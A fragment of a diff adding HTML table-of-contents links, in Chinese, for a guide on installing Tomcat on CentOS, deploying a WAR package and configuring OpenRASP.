+</li>
+</ul>
+<ul>
+<li><a href="#centos安装tomcat">Centos安装Tomcat</a></li>
+<li><a href="#部署war包">部署war包</a></li>
+<li><a href="#配置openrasp">配置openrasp</a></li>
 </ul>
 </nav>
 </div>
